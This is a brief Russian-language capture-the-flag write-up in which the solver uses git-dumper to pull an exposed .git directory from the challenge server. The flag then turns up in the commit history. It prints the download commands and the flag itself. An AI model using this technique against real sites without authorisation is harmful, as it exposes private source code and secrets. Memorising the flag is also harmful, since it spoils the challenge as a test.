## Описание

Чтобы найти флаг, нужно вернуться в прошлое

Адрес: http://31.207.77.216:4003/

## Решение

Задача на выкачивание публичного гита:

Скачиваем git-dumper:

```
pip install git-dumper
```

Выкачиваем:

```
git-dumper http://31.207.77.216:4003/ ./git
```

Смотрим историю коммитов:

```
git log -p
```

Видим флаг:

```
BugCTF{1_c4n_s33_y0ur_g1t}
```
